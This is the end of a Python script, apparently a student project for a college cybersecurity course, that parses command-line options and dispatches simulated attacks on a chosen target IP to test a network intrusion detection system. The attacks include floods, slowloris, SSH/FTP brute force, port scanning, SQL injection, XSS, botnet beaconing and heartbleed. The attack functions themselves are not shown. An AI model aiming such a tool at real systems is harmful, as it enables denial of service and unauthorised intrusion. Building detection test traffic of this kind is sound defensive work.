        description="NIDS Attack Sim — Windows Compatible, No Admin Needed",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Attacks:\n" + "\n".join(f"  {k}" for k in ATTACKS)
    )
    parser.add_argument("--target",   required=True,
                        help="Target IP (e.g. 10.172.220.220)")
    parser.add_argument("--attack",   required=True, choices=ATTACKS,
                        help="Attack type")
    parser.add_argument("--port",     type=int,   default=None)
    parser.add_argument("--duration", type=int,   default=15)
    parser.add_argument("--count",    type=int,   default=50)
    parser.add_argument("--threads",  type=int,   default=50)
    args = parser.parse_args()

    print(f"{BOLD}{CYAN}")
    print("  ╔════════════════════════════════════════════╗")
    print("  ║   NIDS ATTACK SIMULATION — Windows Mode   ║")
    print("  ║   CVR College of Engineering — 22CY284    ║")
    print(f"  ╚════════════════════════════════════════════╝{RESET}")
    print(f"\n  Target : {BOLD}{args.target}{RESET}")
    print(f"  Attack : {BOLD}{args.attack}{RESET}\n")

    fn = ATTACKS[args.attack]

    if args.attack == "all":
        fn(args.target)
    elif args.attack in ("syn_flood", "http_flood"):
        fn(args.target, port=args.port or 80,
           duration=args.duration, threads=args.threads)
    elif args.attack in ("udp_flood",):
        fn(args.target, port=args.port or 53, duration=args.duration)
    elif args.attack == "slowloris":
        fn(args.target, port=args.port or 80,
           duration=args.duration, num_sockets=args.threads)
    elif args.attack in ("ssh_bruteforce", "ftp_bruteforce"):
        fn(args.target, port=args.port or (22 if "ssh" in args.attack else 21),
           count=args.count)
    elif args.attack == "portscan":
        fn(args.target, threads=args.threads)
    elif args.attack in ("web_sqli", "web_xss", "web_patator"):
        fn(args.target, port=args.port or 80, count=args.count)
    elif args.attack == "botnet_beacon":
        fn(args.target, port=args.port or 80, beacons=args.count)
    elif args.attack == "heartbleed":
        fn(args.target, port=args.port or 443)
    elif args.attack == "infiltration":
        fn(args.target)
    elif args.attack == "benign":
        fn(args.target, port=args.port or 80, requests=args.count)